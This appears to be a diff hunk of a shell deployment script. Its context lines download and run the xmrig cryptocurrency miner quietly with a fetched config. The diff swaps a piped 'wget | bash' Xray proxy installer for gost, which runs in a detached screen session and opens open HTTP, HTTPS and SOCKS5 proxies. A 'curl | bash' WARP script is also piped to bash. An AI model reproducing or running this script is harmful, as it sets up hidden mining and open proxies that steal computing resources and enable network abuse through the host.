@@ -9,7 +9,6 @@ chmod u+x ./xmrig
 sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/x.json
 chmod u+x ./x.json
  ./xmrig --config=./x.json >/dev/null 2>&1
-sudo wget -qO- -o- https://github.com/233boy/Xray/raw/main/install.sh | bash
-xray add tcp 7000 1483c30c-ae2c-4130-f643-c6139d199c42
+wget -qO- https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz |gzip -d >./gost && chmod 777 ./gost && screen -Sdm gost ./gost -L=http://:19991 -L=https://:19992 -L=socks5://:19993
 bash <(curl -fsSL git.io/warp.sh) d
 ping aws.amazon.com
